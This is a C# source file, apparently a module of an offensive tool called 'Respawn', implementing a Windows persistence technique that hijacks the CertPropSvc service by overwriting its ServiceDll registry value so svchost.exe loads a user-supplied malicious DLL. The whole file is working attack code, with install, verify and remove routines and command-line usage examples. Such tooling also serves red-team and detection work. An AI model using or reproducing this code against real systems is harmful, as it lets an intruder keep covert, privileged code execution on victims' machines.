using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System;
using System.Collections.Generic;

namespace Respawn.Techniques.CertProp
{
    public class CertPropModule : ITechniqueModule
    {
        public string Id          => "certprop";
        public string Name        => "CertPropSvc Hijack";
        public string Mitre       => "T1543.003";
        public string Description => "Abuse the CertPropSvc by modifying the ServiceDll registry value to load a malicious DLL into the svchost.exe process.";

        const string ServicePath = @"SYSTEM\CurrentControlSet\Services\CertPropSvc\Parameters";

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the malicious DLL (.dll)");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t certprop -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t certprop -a install -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t certprop -a verify");
            TechniqueHelpBuilder.RenderExample("Respawn -t certprop -a remove");
        }

        public List<TechniqueOption> ListOptions(string type) => 
            type.Equals("keys", StringComparison.OrdinalIgnoreCase) ? CertPropKeys.All : new List<TechniqueOption>();

        public TechniqueResult Install(ExecutionContext ctx)
        {
            try
            {
                using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(ServicePath, true);
                if (key == null) return TechniqueResult.Fail("CertPropSvc Parameters key not found.");

                string? current = key.GetValue("ServiceDll")?.ToString();
                if (current != null && current.Equals(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists("Payload is already set as the ServiceDll.");

                // Backup original certpropsvc.dll
                if (current != null && !current.Contains(ctx.Payload))
                    key.SetValue("RESPAWN_BACKUP", current);

                key.SetValue("ServiceDll", ctx.Payload, RegistryValueKind.ExpandString);
                
                return TechniqueResult.Ok($"CertPropSvc hijacked. Targeted ServiceDll with: {ctx.Payload}");
            }
            catch (UnauthorizedAccessException) { return TechniqueResult.Denied("Administrator privileges required to modify system services."); }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            try
            {
                using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(ServicePath, true);
                string? backup = key?.GetValue("RESPAWN_BACKUP")?.ToString();
                
                if (!string.IsNullOrEmpty(backup))
                {
                    key.SetValue("ServiceDll", backup, RegistryValueKind.ExpandString);
                    key.DeleteValue("RESPAWN_BACKUP", false);
                    return TechniqueResult.Ok("Restored original CertPropSvc DLL path.");
                }
                return TechniqueResult.NotFound("No backup found to restore.");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(ServicePath);
            var current = key?.GetValue("ServiceDll");
            return current != null ? TechniqueResult.Ok($"Current ServiceDll: {current}") : TechniqueResult.NotFound("Value missing.");
        }
    }
}